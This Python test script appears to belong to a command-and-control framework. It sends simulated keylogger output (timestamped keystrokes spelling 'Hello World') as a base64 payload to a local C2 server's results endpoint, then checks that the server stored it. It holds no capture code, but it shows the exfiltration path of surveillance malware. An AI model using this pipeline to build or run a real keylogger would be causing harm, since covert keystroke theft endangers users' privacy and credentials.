#!/usr/bin/env python3
"""
Test script to verify keylogger data transmission to C2 server
"""

import requests
import json
import base64
import time

def test_keylogger_c2():
    """Test keylogger data transmission to C2 server"""
    
    C2_URL = "http://localhost:5000"
    
    print("⌨️ Testing Keylogger C2 Integration")
    print("=" * 50)
    
    try:
        # Test 1: Check if C2 server is running
        print("🔍 Testing C2 server connection...")
        try:
            response = requests.get(f"{C2_URL}/", timeout=5)
            if response.status_code == 200:
                print("✅ C2 server is running")
            else:
                print(f"⚠️ C2 server responded with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"❌ Cannot connect to C2 server: {e}")
            print("Make sure the C2 server is running on http://localhost:5000")
            return
        
        # Test 2: Simulate keylogger data
        print("\n📤 Simulating keylogger data transmission...")
        
        # Create sample keylog data
        sample_keylog_data = {
            "agent_id": "test_agent_001",
            "task_id": "keylog_test_001",
            "result": {
                "status": "success",
                "message": "Keylogger data captured",
                "captured_keys": [
                    {"key": "H", "timestamp": "2025-08-17T15:10:00.000000", "raw_key": "'H'"},
                    {"key": "e", "timestamp": "2025-08-17T15:10:01.000000", "raw_key": "'e'"},
                    {"key": "l", "timestamp": "2025-08-17T15:10:02.000000", "raw_key": "'l'"},
                    {"key": "l", "timestamp": "2025-08-17T15:10:03.000000", "raw_key": "'l'"},
                    {"key": "o", "timestamp": "2025-08-17T15:10:04.000000", "raw_key": "'o'"},
                    {"key": "[SPACE]", "timestamp": "2025-08-17T15:10:05.000000", "raw_key": "Key.space"},
                    {"key": "W", "timestamp": "2025-08-17T15:10:06.000000", "raw_key": "'W'"},
                    {"key": "o", "timestamp": "2025-08-17T15:10:07.000000", "raw_key": "'o'"},
                    {"key": "r", "timestamp": "2025-08-17T15:10:08.000000", "raw_key": "'r'"},
                    {"key": "l", "timestamp": "2025-08-17T15:10:09.000000", "raw_key": "'l'"},
                    {"key": "d", "timestamp": "2025-08-17T15:10:10.000000", "raw_key": "'d'"}
                ],
                "text": "Hello World",
                "word_count": 2,
                "character_count": 11,
                "timestamp": "2025-08-17T15:10:10.000000",
                "type": "surveillance_keylogger"
            },
            "timestamp": "2025-08-17T15:10:10.000000",
            "type": "surveillance_keylogger"
        }
        
        # Encode data as base64
        json_str = json.dumps(sample_keylog_data, ensure_ascii=False)
        encoded_data = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')
        
        # Prepare the request payload
        payload = {
            "data": encoded_data
        }
        
        print(f"   Data to send: {json_str[:100]}...")
        print(f"   Base64 encoded length: {len(encoded_data)}")
        
        # Test 3: Send data to C2 server
        print("\n📡 Sending data to C2 server...")
        try:
            response = requests.post(
                f"{C2_URL}/api/results",
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            print(f"   Response status: {response.status_code}")
            print(f"   Response headers: {dict(response.headers)}")
            
            if response.status_code == 200:
                print("✅ Data sent successfully!")
                response_data = response.json()
                print(f"   Response: {response_data}")
            else:
                print(f"❌ Failed to send data: {response.status_code}")
                try:
                    error_data = response.json()
                    print(f"   Error details: {error_data}")
                except:
                    print(f"   Error text: {response.text}")
                    
        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
        
        # Test 4: Check if data was received
        print("\n🔍 Checking if data was received...")
        try:
            response = requests.get(f"{C2_URL}/api/results/test_agent_001", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success' and data.get('results'):
                    print("✅ Data received and stored by C2 server!")
                    print(f"   Results count: {len(data['results'])}")
                    
                    # Find our keylog result
                    keylog_results = [r for r in data['results'] if r.get('type') == 'surveillance_keylogger']
                    if keylog_results:
                        print(f"   Keylog results found: {len(keylog_results)}")
                        latest = keylog_results[0]
                        print(f"   Latest keylog: {latest.get('result', {}).get('text', 'No text')}")
                    else:
                        print("   No keylog results found")
                else:
                    print("❌ No results found in response")
            else:
                print(f"❌ Failed to get results: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Failed to check results: {e}")
        
        print("\n✅ Keylogger C2 integration test completed!")
        
    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    test_keylogger_c2()
